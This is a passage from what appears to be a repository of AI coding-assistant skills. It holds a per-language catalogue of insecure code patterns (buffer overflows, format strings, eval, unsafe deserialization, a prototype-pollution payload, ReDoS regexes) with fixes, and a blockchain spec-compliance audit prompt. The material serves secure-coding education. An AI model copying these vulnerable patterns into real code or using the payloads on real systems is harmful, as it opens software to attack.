}\n}\n\n// BUT: @objc interop can bypass\n// AND: Unsafe pointers have no initialization guarantees\n```\n\n## Protocol Witness Table Issues\n\n```swift\n// DANGEROUS: Protocol with Self requirement\nprotocol Equatable {\n    static func ==(lhs: Self, rhs: Self) -> Bool\n}\n\n// Can't use heterogeneously:\nvar items: [Equatable] = [...]  // Error!\n// Must use type erasure or existentials\n```\n\n## KeyPath Subscript Confusion\n\n```swift\n// DANGEROUS: Similar syntax, different behavior\nstruct User {\n    var name: String\n    subscript(key: String) -> String? { ... }\n}\n\nuser[\"name\"]       // Calls subscript\nuser[keyPath: \\.name]  // Uses KeyPath\n\n// Easy to confuse when debugging\n```\n\n## Codable Pitfalls\n\n```swift\n// DANGEROUS: Decoding fails silently with wrong types\nstruct User: Codable {\n    var id: Int\n}\n\n// JSON: {\"id\": \"123\"}  // String, not Int\n// Throws DecodingError, but often caught broadly\n\n// DANGEROUS: Missing keys\nstruct User: Codable {\n    var id: Int\n    var name: String  // Required\n}\n\n// JSON: {\"id\": 1}  // Missing \"name\"\n// Throws, but error message may not be clear\n```\n\n**Fix**: Use explicit CodingKeys and handle errors:\n```swift\nstruct User: Codable {\n    var id: Int\n    var name: String?  // Optional for missing keys\n\n    enum CodingKeys: String, CodingKey {\n        case id\n        case name\n    }\n}\n```\n\n## Objective-C Interop\n\n```swift\n// DANGEROUS: Objective-C returns nullable even when Swift sees non-optional\n@objc func legacyMethod() -> NSString  // May actually return nil\n\n// DANGEROUS: Objective-C exceptions not caught by Swift\n// NSException bypasses Swift error handling\n\n// DANGEROUS: Objective-C performSelector\nlet result = obj.perform(NSSelectorFromString(userInput))\n// Can call any method!\n```\n\n## Detection Patterns\n\n| Pattern | Risk |\n|---------|------|\n| `!` force unwrap | Crash on nil |\n| `as!` force cast | Crash on type mismatch |\n| `try!` | Crash on error |\n| `try?` without handling nil | Silent failure |\n| `String!` IUO types | Deferred crash |\n| Closure capturing `self` without `[weak self]` | Memory leak |\n| Collections modified from multiple threads | Race condition |\n| NSString/String conversion with ranges | Index mismatch |\n| `&+`, `&-`, `&*` operators | Silent overflow |\n| `@objc` methods returning non-optional | Nil bridge issues |\n",
        "plugins/sharp-edges/skills/sharp-edges/references/language-specific.md": "# Language-Specific Sharp Edges\n\nGeneral programming footguns by languagenot limited to cryptography.\n\n## C / C++\n\n### Integer Overflow is Undefined Behavior\n\n```c\n// DANGEROUS: Signed overflow is UB, compiler can optimize away checks\nint x = INT_MAX;\nif (x + 1 > x) {  // Compiler may assume always true (UB)\n    // Overflow check optimized away!\n}\n\n// DANGEROUS: Size calculations\nsize_t size = user_count * sizeof(struct User);\n// If user_count * sizeof overflows, allocates tiny buffer\nvoid *buf = malloc(size);\n```\n\n**The Problem**: Signed integer overflow is undefined behavior. Compilers assume it never happens and optimize accordinglyincluding removing overflow checks.\n\n### Buffer Handling\n\n```c\n// DANGEROUS: No bounds checking\nchar buf[64];\nstrcpy(buf, user_input);      // Classic overflow\nsprintf(buf, \"Hello %s\", name); // Format + overflow\ngets(buf);                     // Never use, removed in C11\n\n// DANGEROUS: Off-by-one\nchar buf[64];\nstrncpy(buf, src, 64);        // NOT null-terminated if src >= 64!\nbuf[63] = '\\0';               // Must do manually\n```\n\n### Format Strings\n\n```c\n// DANGEROUS: User controls format\nprintf(user_input);           // Format string attack\nsyslog(LOG_INFO, user_input); // Same problem\n\n// SAFE: Format as literal\nprintf(\"%s\", user_input);\n```\n\n### Memory Cleanup\n\n```c\n// DANGEROUS: Secrets persist\nchar password[64];\n// ... use password ...\nmemset(password, 0, sizeof(password));  // May be optimized away!\n\n// SAFER: Use explicit_bzero or volatile\nexplicit_bzero(password, sizeof(password));  // Won't be optimized\n```\n\n---\n\n## Go\n\n### Silent Integer Overflow\n\n```go\n// DANGEROUS: Overflow wraps silently (no panic!)\nvar x int32 = math.MaxInt32\nx = x + 1  // Wraps to -2147483648, no error\n\n// This enables vulnerabilities in:\n// - Size calculations for allocations\n// - Loop bounds\n// - Financial calculations\n```\n\n**The Problem**: Unlike Rust (debug panics), Go silently wraps. Fuzzing may never find overflow bugs because they don't crash.\n\n### Slice Aliasing\n\n```go\n// DANGEROUS: Slices share backing array\noriginal := []int{1, 2, 3, 4, 5}\nslice1 := original[1:3]  // {2, 3}\nslice2 := original[2:4]  // {3, 4}\n\nslice1[1] = 999  // Modifies original AND slice2!\n// slice2 is now {999, 4}\n```\n\n### Interface Nil Confusion\n\n```go\n// DANGEROUS: Typed nil vs untyped nil\nvar p *MyStruct = nil\nvar i interface{} = p\n\nif i == nil {\n    // This is FALSE! i holds (type=*MyStruct, value=nil)\n    // An interface is only nil if both type and value are nil\n}\n\n// Common in error handling:\nfunc getError() error {\n    var err *MyError = nil\n    return err  // Returns non-nil error interface!\n}\n```\n\n### JSON Field Matching\n\n```go\n// DANGEROUS: Go's JSON decoder is case-insensitive\ntype User struct {\n    Admin bool `json:\"admin\"`\n}\n\n// Attacker sends: {\"ADMIN\": true} or {\"Admin\": true}\n// Both match the \"admin\" field!\n\n// Also: duplicate keys - last one wins\n// {\"admin\": false, \"admin\": true}  Admin = true\n```\n\n**Fix**: Use `DisallowUnknownFields()` and consider exact-match libraries.\n\n### Defer in Loops\n\n```go\n// DANGEROUS: All defers execute at function end, not loop iteration\nfor _, file := range files {\n    f, _ := os.Open(file)\n    defer f.Close()  // Files stay open until function returns!\n}\n// Can exhaust file descriptors on large loops\n```\n\n---\n\n## Rust\n\n### Integer Overflow Behavior Changes\n\n```rust\n// In debug builds: panics\n// In release builds: wraps silently!\nlet x: u8 = 255;\nlet y = x + 1;  // Debug: panic! Release: y = 0\n```\n\n**The Problem**: Behavior differs between debug and release. Bugs may only manifest in production.\n\n**Fix**: Use `wrapping_*`, `checked_*`, or `saturating_*` explicitly.\n\n### Unsafe Blocks\n\n```rust\n// DANGEROUS: Unsafe disables Rust's safety guarantees\nunsafe {\n    // Can create data races\n    // Can dereference raw pointers\n    // Can call unsafe functions\n    // Can access mutable statics\n}\n\n// Common in FFIaudit all unsafe blocks carefully\n```\n\n### Mem::forget Skips Destructors\n\n```rust\n// DANGEROUS: Resources never cleaned up\nlet guard = Mutex::lock().unwrap();\nstd::mem::forget(guard);  // Lock never released = deadlock\n\n// Also problematic for:\n// - File handles\n// - Memory mappings\n// - Cryptographic key cleanup\n```\n\n### Unwrap Panics\n\n```rust\n// DANGEROUS: Panics on None/Err\nlet value = some_option.unwrap();  // Panics if None\nlet result = fallible_fn().unwrap();  // Panics if Err\n\n// In libraries: propagate errors with ?\n// In binaries: use expect() with message, or handle properly\n```\n\n---\n\n## Swift\n\n### Force Unwrapping\n\n```swift\n// DANGEROUS: Crashes on nil\nlet value = optionalValue!  // Runtime crash if nil\n\n// DANGEROUS: Implicitly unwrapped optionals\nvar name: String!  // IUO - crashes if accessed while nil\n```\n\n### Bridge Type Surprises\n\n```swift\n// DANGEROUS: NSString/String bridging\nlet nsString: NSString = \"hello\"\nlet range = nsString.range(of: \"\")  // UTF-16 range\nlet swiftString = nsString as String\n// Range semantics differ between NSString (UTF-16) and String (grapheme clusters)\n```\n\n---\n\n## Java\n\n### Equality Confusion\n\n```java\n// DANGEROUS: Reference equality, not value equality\nString a = new String(\"hello\");\nString b = new String(\"hello\");\nif (a == b) {  // FALSE - different objects\n}\n\nInteger x = 128;\nInteger y = 128;\nif (x == y) {  // FALSE - outside cached range [-128, 127]\n}\n\nInteger p = 127;\nInteger q = 127;\nif (p == q) {  // TRUE - cached, but misleading\n}\n```\n\n### Type Erasure\n\n```java\n// DANGEROUS: Generic types erased at runtime\nList<String> strings = new ArrayList<>();\nList<Integer> ints = new ArrayList<>();\n\n// At runtime, both are just \"List\" - no type checking\n// Can cast incorrectly and get ClassCastException later\n\n// Also: can't do runtime checks\nif (obj instanceof List<String>) {  // Compile error\n}\n```\n\n### Serialization\n\n```java\n// DANGEROUS: Like pickle, arbitrary code execution\nObjectInputStream ois = new ObjectInputStream(untrustedInput);\nObject obj = ois.readObject();  // Executes readObject() on malicious classes\n\n// \"Gadget chains\" in libraries enable RCE\n// Even without executing readObject(), deserialization triggers code\n```\n\n### Swallowed Exceptions\n\n```java\n// DANGEROUS: Empty catch blocks\ntry {\n    sensitiveOperation();\n} catch (Exception e) {\n    // Silently swallowed - security failure masked\n}\n```\n\n---\n\n## Kotlin\n\n### Platform Types from Java\n\n```kotlin\n// DANGEROUS: Java returns can be null, but Kotlin doesn't know\nval result = javaLibrary.getValue()  // Platform type: String!\nresult.length  // NPE if Java returned null!\n\n// Kotlin trusts Java's lack of nullability annotations\n```\n\n### Not-Null Assertion\n\n```kotlin\n// DANGEROUS: Throws NPE\nval value = nullableValue!!  // KotlinNullPointerException if null\n```\n\n### Lateinit Pitfalls\n\n```kotlin\n// DANGEROUS: Accessing before initialization throws\nlateinit var config: Config\n\nfun process() {\n    config.value  // UninitializedPropertyAccessException\n}\n```\n\n---\n\n## C#\n\n### Nullable Reference Types Opt-In\n\n```csharp\n// DANGEROUS: NRT is opt-in, not enforced by default\n// Project must enable: <Nullable>enable</Nullable>\n\n// Even when enabled, it's warnings only by default\nstring? nullable = null;\nstring nonNull = nullable;  // Warning, not error\nnonNull.Length;  // NullReferenceException at runtime\n```\n\n### Default Struct Values\n\n```csharp\n// DANGEROUS: Structs have default values that may be invalid\nstruct Connection {\n    public string Host;  // Default: null\n    public int Port;     // Default: 0\n}\n\nvar conn = default(Connection);\n// conn.Host is null, conn.Port is 0 - probably invalid\n```\n\n### IDisposable Leaks\n\n```csharp\n// DANGEROUS: Resources not disposed\nvar conn = new SqlConnection(connectionString);\nconn.Open();\n// Exception here = connection never closed\n\n// SAFE: using statement\nusing var conn = new SqlConnection(connectionString);\nconn.Open();\n// Disposed even on exception\n```\n\n---\n\n## PHP\n\n### Type Juggling\n\n```php\n// DANGEROUS: Loose comparison (==) does type coercion\n\"0e123\" == \"0e456\"  // TRUE - both are 0 in scientific notation\n\"0\" == false        // TRUE\n\"\" == false         // TRUE\n[] == false         // TRUE\nnull == false       // TRUE\n\n// Magic hash comparison\n\"0e462097431906509019562988736854\" == \"0\"  // TRUE\n// MD5(\"240610708\") starts with 0e... = compares as 0\n\n// SAFE: Strict comparison (===)\n\"0e123\" === \"0e456\"  // FALSE\n```\n\n### Variable Variables and Extract\n\n```php\n// DANGEROUS: User controls variable names\n$name = $_GET['name'];\n$$name = $_GET['value'];  // Variable variable - arbitrary assignment\n\n// DANGEROUS: Extract creates variables from array\nextract($_POST);  // Every POST param becomes a variable\n// Attacker sends: POST isAdmin=true  $isAdmin = true\n```\n\n### Unserialize\n\n```php\n// DANGEROUS: Like pickle, arbitrary object instantiation\n$obj = unserialize($user_input);\n\n// Triggers __wakeup(), __destruct() on crafted objects\n// Can chain to RCE via \"POP gadgets\" in libraries\n```\n\n---\n\n## JavaScript / TypeScript\n\n### Coercion Madness\n\n```javascript\n// DANGEROUS: == coerces types unpredictably\n\"0\" == false   // true\n\"\" == false    // true\n[] == false    // true\n[] == ![]      // true (wat)\n\n// SAFE: === for strict equality\n\"0\" === false  // false\n```\n\n### Prototype Pollution\n\n```javascript\n// DANGEROUS: Merging untrusted objects\nfunction merge(target, source) {\n    for (let key in source) {\n        target[key] = source[key];  // Includes __proto__!\n    }\n}\n\n// Attacker sends: {\"__proto__\": {\"isAdmin\": true}}\nmerge({}, userInput);\n// Now ALL objects have isAdmin === true\n({}).isAdmin  // true\n```\n\n**Fix**: Check `hasOwnProperty`, use `Object.create(null)`, or safe merge libraries.\n\n### Regex DoS (ReDoS)\n\n```javascript\n// DANGEROUS: Catastrophic backtracking\nconst regex = /^(a+)+$/;\nregex.test(\"aaaaaaaaaaaaaaaaaaaaaaaaaaaa!\");\n// Exponential time - freezes the event loop\n\n// Patterns to avoid: nested quantifiers (a+)+, (a*)*\n// Overlapping alternatives: (a|a)+\n```\n\n### ParseInt Radix\n\n```javascript\n// DANGEROUS: Radix not specified\nparseInt(\"08\");   // 8 in modern JS, was 0 in old (octal)\nparseInt(\"0x10\"); // 16 - hex prefix recognized\n\n// SAFE: Always specify radix\nparseInt(\"08\", 10);  // 8\n```\n\n---\n\n## Python\n\n### Mutable Default Arguments\n\n```python\n# DANGEROUS: Default is shared across calls\ndef append_to(item, target=[]):\n    target.append(item)\n    return target\n\nappend_to(1)  # [1]\nappend_to(2)  # [1, 2] - same list!\n\n# SAFE: Use None sentinel\ndef append_to(item, target=None):\n    if target is None:\n        target = []\n    target.append(item)\n    return target\n```\n\n### Eval and Friends\n\n```python\n# DANGEROUS: Arbitrary code execution\neval(user_input)      # Executes Python expression\nexec(user_input)      # Executes Python statements\ncompile(user_input, '', 'exec')  # Compiles for later exec\n\n# Also via:\ninput()  # In Python 2, equivalent to eval(raw_input())\n```\n\n### Late Binding Closures\n\n```python\n# DANGEROUS: Closures capture variable by reference\nfuncs = []\nfor i in range(3):\n    funcs.append(lambda: i)\n\n[f() for f in funcs]  # [2, 2, 2] - all see final i\n\n# SAFE: Capture by value with default argument\nfuncs = []\nfor i in range(3):\n    funcs.append(lambda i=i: i)\n\n[f() for f in funcs]  # [0, 1, 2]\n```\n\n### Is vs ==\n\n```python\n# DANGEROUS: 'is' checks identity, not equality\na = 256\nb = 256\na is b  # True - cached small integers\n\na = 257\nb = 257\na is b  # False - different objects!\n\n# Same string issue:\ns1 = \"hello\"\ns2 = \"hello\"\ns1 is s2  # True - interned\n\ns1 = \"hello world\"\ns2 = \"hello world\"\ns1 is s2  # Maybe - depends on interpreter\n```\n\n---\n\n## Ruby\n\n### Dynamic Execution\n\n```ruby\n# DANGEROUS: Arbitrary code execution\neval(user_input)           # Executes Ruby code\nsend(user_input, *args)    # Calls arbitrary method\nconstantize(user_input)    # Gets arbitrary constant/class\npublic_send(user_input)    # Calls public method by name\n\n# Rails-specific:\nparams[:controller].constantize  # Class injection\n```\n\n### YAML.load\n\n```ruby\n# DANGEROUS: Arbitrary object instantiation (like pickle)\nYAML.load(user_input)\n\n# Attacker sends YAML that instantiates arbitrary objects\n# Can chain to RCE via \"gadget\" classes\n\n# SAFE: Use safe_load\nYAML.safe_load(user_input)\n```\n\n### Mass Assignment\n\n```ruby\n# DANGEROUS: All params assigned to model\nUser.new(params[:user])  # If params includes {admin: true}...\n\n# Rails 4+ requires strong parameters:\nparams.require(:user).permit(:name, :email)  # Explicitly allowlist\n```\n\n---\n\n## Quick Reference Table\n\n| Language | Primary Sharp Edges |\n|----------|-------------------|\n| C/C++ | Integer overflow UB, buffer overflows, format strings, memory cleanup |\n| Go | Silent int overflow, slice aliasing, interface nil, JSON case-insensitive |\n| Rust | Debug/release overflow difference, unsafe blocks, mem::forget |\n| Swift | Force unwrap, implicitly unwrapped optionals |\n| Java | == vs equals, type erasure, serialization, swallowed exceptions |\n| Kotlin | Platform types, !!, lateinit |\n| C# | NRT opt-in, default struct values, IDisposable leaks |\n| PHP | Type juggling (==), extract(), unserialize() |\n| JS/TS | == coercion, prototype pollution, ReDoS, parseInt radix |\n| Python | Mutable defaults, eval/exec/pickle, late binding, is vs == |\n| Ruby | eval/send/constantize, YAML.load, mass assignment |\n",
        "plugins/spec-to-code-compliance/.claude-plugin/plugin.json": "{\n  \"name\": \"spec-to-code-compliance\",\n  \"version\": \"1.0.0\",\n  \"description\": \"Specification-to-code compliance checker for blockchain audits with evidence-based alignment analysis\",\n  \"author\": {\n    \"name\": \"Omar Inuwa\",\n    \"email\": \"opensource@trailofbits.com\",\n    \"url\": \"https://github.com/trailofbits\"\n  }\n}\n",
        "plugins/spec-to-code-compliance/README.md": "# Spec-to-Code Compliance\n\nSpecification-to-code compliance checker for blockchain audits with evidence-based alignment analysis.\n\n**Author:** Omar Inuwa\n\n## When to Use\n\nUse this skill when you need to:\n- Verify that code implements exactly what documentation specifies\n- Find gaps between intended behavior and actual implementation\n- Audit smart contracts against whitepapers or design documents\n- Identify undocumented code behavior or unimplemented spec claims\n\n## What It Does\n\nThis skill performs deterministic, evidence-based alignment between specifications and code:\n\n- **Documentation Discovery** - Finds all spec sources (whitepapers, READMEs, design notes)\n- **Spec Intent Extraction** - Normalizes all intended behavior into structured format\n- **Code Behavior Analysis** - Line-by-line semantic analysis of actual implementation\n- **Alignment Comparison** - Maps spec items to code with match types and confidence scores\n- **Divergence Classification** - Categorizes misalignments by severity (Critical/High/Medium/Low)\n\n## Key Principle\n\n**Zero speculation.** Every claim must be backed by:\n- Exact quotes from documentation (section/title)\n- Specific code references (file + line numbers)\n- Confidence scores (0-1) for all mappings\n\n## Installation\n\n```\n/plugin install trailofbits/skills/plugins/spec-to-code-compliance\n```\n\n## Phases\n\n1. **Documentation Discovery** - Identify all spec sources\n2. **Format Normalization** - Create clean spec corpus\n3. **Spec Intent IR** - Extract all intended behavior\n4. **Code Behavior IR** - Line-by-line code analysis\n5. **Alignment IR** - Compare spec to code\n6. **Divergence Classification** - Categorize misalignments\n7. **Final Report** - Generate audit-grade compliance report\n\n## Match Types\n\n- `full_match` - Code exactly implements spec\n- `partial_match` - Incomplete implementation\n- `mismatch` - Spec says X, code does Y\n- `missing_in_code` - Spec claim not implemented\n- `code_stronger_than_spec` - Code adds behavior\n- `code_weaker_than_spec` - Code misses requirements\n\n## Anti-Hallucination Rules\n\n- If spec is silent: classify as **UNDOCUMENTED**\n- If code adds behavior: classify as **UNDOCUMENTED CODE PATH**\n- If unclear: classify as **AMBIGUOUS**\n- Every claim must quote original text or line numbers\n\n## Related Skills\n\n- `context-building` - Deep code understanding\n- `issue-writer` - Format compliance gaps as findings\n",
        "plugins/spec-to-code-compliance/commands/spec-compliance.md": "---\nname: trailofbits:spec-compliance\ndescription: Verifies code implements specification requirements\nargument-hint: \"<spec-document> <codebase-path>\"\nallowed-tools:\n  - Read\n  - Write\n  - Grep\n  - Glob\n  - Bash\n  - WebFetch\n---\n\n# Verify Spec-to-Code Compliance\n\n**Arguments:** $ARGUMENTS\n\nParse arguments:\n1. **Spec document** (required): Path to specification (PDF, MD, DOCX, HTML, TXT, or URL)\n2. **Codebase path** (required): Path to codebase to verify\n\nInvoke the `spec-to-code-compliance` skill with these arguments for the full workflow.\n",
        "plugins/spec-to-code-compliance/skills/spec-to-code-compliance/SKILL.md": "---\nname: spec-to-code-compliance\ndescription: Verifies code implements exactly what documentation specifies for blockchain audits. Use when comparing code against whitepapers, finding gaps between specs and implementation, or performing compliance checks for protocol implementations.\n---\n\n## When to Use\n\nUse this skill when you need to:\n- Verify code implements exactly what documentation specifies\n- Audit smart contracts against whitepapers or design documents\n- Find gaps between intended behavior and actual implementation\n- Identify undocumented code behavior or unimplemented spec claims\n- Perform compliance checks for blockchain protocol implementations\n\n**Concrete triggers:**\n- User provides both specification documents AND codebase\n- Questions like \"does this code match the spec?\" or \"what's missing from the implementation?\"\n- Audit engagements requiring spec-to-code alignment analysis\n- Protocol implementations being verified against whitepapers\n\n## When NOT to Use\n\nDo NOT use this skill for:\n- Codebases without corresponding specification documents\n- General code review or vulnerability hunting (use audit-context-building instead)\n- Writing or improving documentation (this skill only verifies compliance)\n- Non-blockchain projects without formal specifications\n\n# Spec-to-Code Compliance Checker Skill\n\nYou are the **Spec-to-Code Compliance Checker**  a senior-level blockchain auditor whose job is to determine whether a codebase implements **exactly** what the documentation states, across logic, invariants, flows, assumptions, math, and security guarantees.\n\nYour work must be:\n- deterministic\n- grounded in evidence\n- traceable\n- non-hallucinatory\n- exhaustive\n\n---\n\n# GLOBAL RULES\n\n- **Never infer unspecified behavior.**\n- **Always cite exact evidence** from:\n  - the documentation (section/title/quote)\n  - the code (file + line numbers)\n- **Always provide a confidence score (01)** for mappings.\n- **Always classify ambiguity** instead of guessing.\n- Maintain strict separation between:\n  1. extraction\n  2. alignment\n  3. classification\n  4. reporting\n- **Do NOT rely on prior knowledge** of known protocols. Only use provided materials.\n- Be literal, pedantic, and exhaustive.\n\n---\n\n## Rationalizations (Do Not Skip)\n\n| Rationalization | Why It's Wrong | Required Action |\n|-----------------|----------------|-----------------|\n| \"Spec is clear enough\" | Ambiguity hides in plain sight | Extract to IR, classify ambiguity explicitly |\n| \"Code obviously matches\" | Obvious matches have subtle divergences | Document match_type with evidence |\n| \"I'll note this as partial match\" | Partial = potential vulnerability | Investigate until full_match or mismatch |\n| \"This undocumented behavior is fine\" | Undocumented = untested = risky | Classify as UNDOCUMENTED CODE PATH |\n| \"Low confidence is okay here\" | Low confidence findings get ignored | Investigate until confidence  0.8 or classify as AMBIGUOUS |\n| \"I'll infer what the spec meant\" | Inference = hallucination | Quote exact text or mark UNDOCUMENTED |\n\n---\n\n# PHASE 0  Documentation Discovery\n\nIdentify all content representing documentation, even if not named \"spec.\"\n\nDocumentation may appear as:\n- `whitepaper.pdf`\n- `Protocol.md`\n- `design_notes`\n- `Flow.pdf`\n- `README.md`\n- kickoff transcripts\n- Notion exports\n- Anything describing logic, flows, assumptions, incentives, etc.\n\nUse semantic cues:\n- architecture descriptions\n- invariants\n- formulas\n- variable meanings\n- trust models\n- workflow sequencing\n- tables describing logic\n- diagrams (convert to text)\n\nExtract ALL relevant documents into a unified **spec corpus**.\n\n---\n\n# PHASE 1  Universal Format Normalization\n\nNormalize ANY input format:\n- PDF\n- Markdown\n- DOCX\n- HTML\n- TXT\n- Notion export\n- Meeting transcripts\n\nPreserve:\n- heading hierarchy\n- bullet lists\n- formulas\n- tables (converted to plaintext)\n- code snippets\n- invariant definitions\n\nRemove:\n- layout noise\n- styling artifacts\n- watermarks\n\nOutput: a clean, canonical **`spec_corpus`**.\n\n---\n\n# PHASE 2  Spec Intent IR (Intermediate Representation)\n\nExtract **all intended behavior** into the Spec-IR.\n\nEach extracted item MUST include:\n- `spec_excerpt`\n- `source_section`\n- `semantic_type`\n- normalized representation\n- confidence score\n\nExtract:\n\n- protocol purpose\n- actors, roles, trust boundaries\n- variable definitions & expected relationships\n- all preconditions / postconditions\n- explicit invariants\n- implicit invariants deduced from context\n- math formulas (in canonical symbolic form)\n- expected flows & state-machine transitions\n- economic assumptions\n- ordering & timing constraints\n- error conditions & expected revert logic\n- security requirements (\"must/never/always\")\n- edge-case behavior\n\nThis forms **Spec-IR**.\n\nSee [IR_EXAMPLES.md](resources/IR_EXAMPLES.md#example-1-spec-ir-record) for detailed examples.\n\n---\n\n# PHASE 3  Code Behavior IR\n### (WITH TRUE LINE-BY-LINE / BLOCK-BY-BLOCK ANALYSIS)\n\nPerform **structured, deterministic, line-by-line and block-by-block** semantic analysis of the entire codebase.\n\nFor **EVERY LINE** and **EVERY BLOCK**, extract:\n- file + exact line numbers\n- local variable updates\n- state reads/writes\n- conditional branches & alternative paths\n- unreachable branches\n- revert conditions & custom errors\n- external calls (call, delegatecall, staticcall, create2)\n- event emissions\n- math operations and rounding behavior\n- implicit assumptions\n- block-level preconditions & postconditions\n- locally enforced invariants\n- state transitions\n- side effects\n- dependencies on prior state\n\nFor **EVERY FUNCTION**, extract:\n- signature & visibility\n- applied modifiers (and their logic)\n- purpose (based on actual behavior)\n- input/output semantics\n- read/write sets\n- full control-flow structure\n- success vs revert paths\n- internal/external call graph\n- cross-function interactions\n\nAlso capture:\n- storage layout\n- initialization logic\n- authorization graph (roles  permissions)\n- upgradeability mechanism (if present)\n- hidden assumptions\n\nOutput: **Code-IR**, a granular semantic map with full traceability.\n\nSee [IR_EXAMPLES.md](resources/IR_EXAMPLES.md#example-2-code-ir-record) for detailed examples.\n\n---\n\n# PHASE 4  Alignment IR (Spec  Code Comparison)\n\nFor **each item in Spec-IR**:\nLocate related behaviors in Code-IR and generate an Alignment Record containing:\n\n- spec_excerpt\n- code_excerpt (with file + line numbers)\n- match_type:\n  - full_match\n  - partial_match\n  - mismatch\n  - missing_in_code\n  - code_stronger_than_spec\n  - code_weaker_than_spec\n- reasoning trace\n- confidence score (01)\n- ambiguity rating\n- evidence links\n\nExplicitly check:\n- invariants vs enforcement\n- formulas vs math implementation\n- flows vs real transitions\n- actor expectations vs real privilege map\n- ordering constraints vs actual logic\n- revert expectations vs actual checks\n- trust assumptions vs real external call behavior\n\nAlso detect:\n- undocumented code behavior\n- unimplemented spec claims\n- contradictions inside the spec\n- contradictions inside the code\n- inconsistencies across multiple spec documents\n\nOutput: **Alignment-IR**\n\nSee [IR_EXAMPLES.md](resources/IR_EXAMPLES.md#example-3-alignment-record-positive-case) for detailed examples.\n\n---\n\n# PHASE 5  Divergence Classification\n\nClassify each misalignment by severity:\n\n### CRITICAL\n- Spec says X, code does Y\n- Missing invariant enabling exploits\n- Math divergence involving funds\n- Trust boundary mismatches\n\n### HIGH\n- Partial/incorrect implementation\n- Access control misalignment\n- Dangerous undocumented behavior\n\n### MEDIUM\n- Ambiguity with security implications\n- Missing revert checks\n- Incomplete edge-case handling\n\n### LOW\n- Documentation drift\n- Minor semantics mismatch\n\nEach finding MUST include:\n- evidence links\n- severity justification\n- exploitability reasoning\n- recommended remediation\n\nSee [IR_EXAMPLES.md](resources/IR_EXAMPLES.md#example-4-divergence-finding-critical-issue) for detailed divergence finding examples with complete exploit scenarios, economic analysis, and remediation plans.\n\n---\n\n# PHASE 6  Final Audit-Grade Report\n\nProduce a structured compliance report:\n\n1. Executive Summary\n2. Documentation Sources Identified\n3. Spec Intent Breakdown (Spec-IR)\n4. Code Behavior Summary (Code-IR)\n5. Full Alignment Matrix (Spec  Code  Status)\n6. Divergence Findings (with evidence & severity)\n7. Missing invariants\n8. Incorrect logic\n9. Math inconsistencies\n10. Flow/state machine mismatches\n11. Access control drift\n12. Undocumented behavior\n13. Ambiguity hotspots (spec & code)\n14. Recommended remediations\n15. Documentation update suggestions\n16. Final risk assessment\n\n---\n\n## Output Requirements & Quality Standards\n\nSee [OUTPUT_REQUIREMENTS.md](resources/OUTPUT_REQUIREMENTS.md) for:\n- Required IR production standards for all phases\n- Quality thresholds (minimum Spec-IR items, confidence scores, etc.)\n- Format consistency requirements (YAML formatting, line number citations)\n- Anti-hallucination requirements\n\n---\n\n## Completeness Verification\n\nBefore finalizing analysis, review the [COMPLETENESS_CHECKLIST.md](resources/COMPLETENESS_CHECKLIST.md) to verify:\n- Spec-IR completeness (all invariants, formulas, security requirements extracted)\n- Code-IR completeness (all functions analyzed, state changes tracked)\n- Alignment-IR completeness (every spec item has alignment record)\n- Divergence finding quality (exploit scenarios, economic impact, remediation)\n- Final report completeness (all 16 sections present)\n\n---\n\n# ANTI-HALLUCINATION REQUIREMENTS\n\n- If the spec is silent: classify as **UNDOCUMENTED**.\n- If the code adds behavior: classify as **UNDOCUMENTED CODE PATH**.\n- If unclear: classify as **AMBIGUOUS**.\n- Every claim must quote original text or line numbers.\n- Zero speculation.\n- Exhaustive, literal, pedantic reasoning.\n\n---\n\n# Resources\n\n**Detailed Examples:**\n- [IR_EXAMPLES.md](resources/IR_EXAMPLES.md) - Complete IR workflow examples with DEX swap patterns\n\n**Standards & Requirements:**\n- [OUTPUT_REQUIREMENTS.md](resources/OUTPUT_REQUIREMENTS.md) - IR production standards, quality thresholds, format rules\n- [COMPLETENESS_CHECKLIST.md](resources/COMPLETENESS_CHECKLIST.md) - Verification checklist for all phases\n\n---\n\n# END OF SKILL\n",
        "plugins/spec-to-code-compliance/skills/spec-to-code-compliance/resources/COMPLETENESS_CHECKLIST.md": "# Completeness Checklist\n\nBefore finalizing spec-to-code compliance analysis, verify:\n\n---\n\n## Spec-IR Completeness\n\n- [ ] Extracted ALL explicit invariants from specification\n- [ ] Extracted ALL implicit invariants (deduced from context, examples, diagrams)\n- [ ] Extracted ALL formulas and mathematical relationships\n- [ ] Extracted ALL actor definitions, roles, and trust boundaries\n- [ ] Extracted ALL state machine transitions and workflows\n- [ ] Extracted ALL security requirements (MUST/NEVER/ALWAYS keywords)\n- [ ] Extracted ALL preconditions and postconditions\n- [ ] Every Spec-IR item has `source_section` citation\n- [ ] Every Spec-IR item has confidence score (0-1)\n- [ ] Minimum threshold met: 10+ items for non-trivial spec\n\n---\n\n## Code-IR Completeness\n\n- [ ] Analyzed ALL public and external functions (no gaps)\n- [ ] Analyzed ALL internal functions called by public/external functions\n- [ ] Documented ALL state reads with variable names and line numbers\n- [ ] Documented ALL state writes with operations and line numbers\n- [ ] Documented ALL external calls with target, type, return handling, line numbers\n- [ ] Documented ALL revert conditions with exact require/revert statements\n- [ ] Documented ALL modifiers and their enforcement logic\n- [ ] Captured storage layout, initialization logic, authorization graph\n- [ ] Every Code-IR claim has line number citation\n- [ ] Minimum threshold met: 3+ invariants per function\n\n---\n\n## Alignment-IR Completeness\n\n- [ ] EVERY Spec-IR item has corresponding Alignment record (complete 1:1 mapping)\n- [ ] EVERY Alignment record has match_type classification (one of 6 types)\n- [ ] EVERY match_type has reasoning explaining WHY classification was chosen\n- [ ] EVERY Alignment record has evidence with exact quotes (spec_quote AND code_quote)\n- [ ] EVERY divergence (`mismatch`, `missing_in_code`, `code_weaker_than_spec`) has Divergence Finding\n- [ ] Undocumented code behavior explicitly flagged as `code_stronger_than_spec`\n- [ ] Ambiguities classified (not guessed): confidence < 0.8 or ambiguity_notes populated\n- [ ] No placeholder confidence scores (1.0 for everything) - scores reflect actual certainty\n\n---\n\n## Divergence Finding Quality\n\n- [ ] EVERY CRITICAL/HIGH finding has detailed exploit scenario (prerequisites, sequence, impact)\n- [ ] Economic impact quantified with concrete numbers ($X loss, Y% ROI, Z transactions/day)\n- [ ] Remediation includes code examples (not just \"fix this\")\n- [ ] Testing requirements specified (unit, integration, fuzz, fork tests)\n- [ ] Breaking changes documented (migration path, backward compatibility)\n- [ ] Evidence includes exhaustive search results (e.g., \"searched for 'slippage'  0 results\")\n- [ ] Severity justified with exploitability reasoning (not just \"this is critical because...\")\n\n---\n\n## Phase 6 Final Report\n\n- [ ] All 16 sections present (Executive Summary through Final Risk Assessment)\n- [ 